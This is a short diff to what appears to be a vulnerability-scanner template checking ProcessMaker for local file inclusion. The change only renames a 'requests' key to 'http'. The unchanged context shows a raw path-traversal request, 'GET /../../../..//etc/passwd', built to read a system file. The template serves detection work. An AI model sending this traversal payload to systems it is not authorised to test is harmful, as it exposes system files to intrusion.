@@ -10,7 +10,7 @@ info:
     - https://www.processmaker.com
   tags: processmaker,lfi
 
-requests:
+http:
   - raw:
       - |
         GET /../../../..//etc/passwd HTTP/1.1
